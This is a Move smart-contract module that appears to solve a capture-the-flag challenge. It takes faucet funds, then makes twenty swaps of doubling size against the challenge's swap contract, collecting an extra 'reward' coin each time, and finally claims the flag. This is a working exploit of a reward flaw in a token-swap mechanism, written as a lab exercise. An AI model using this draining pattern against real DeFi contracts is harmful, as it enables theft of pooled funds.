module solution::solution4 {

    use std::signer;
    use std::vector;

    use ctfmovement::simple_coin::{Self, SimpleCoin, CoinCap, TestUSDC};
    use ctfmovement::swap::{Self, LPCoin};
    use aptos_framework::coin::{Self, BurnCapability, MintCapability, FreezeCapability, Coin};

    public entry fun solve(account: &signer) {

        simple_coin::claim_faucet(account, 1000000000000000000);
        swap::check_or_register_coin_store<SimpleCoin>(account);
        let base = 10000000000; 
        let i = 0;
        while (i < 20) {
            let tusdc = coin::withdraw<TestUSDC>(account, base);
            let (simple_coin, simple_coin_reward) = swap::swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(tusdc);
            coin::deposit<SimpleCoin>(signer::address_of(account), simple_coin);
            coin::deposit<SimpleCoin>(signer::address_of(account), simple_coin_reward);
            base = base * 2;
            i = i + 1;
        };

        simple_coin::get_flag(account);
    }
}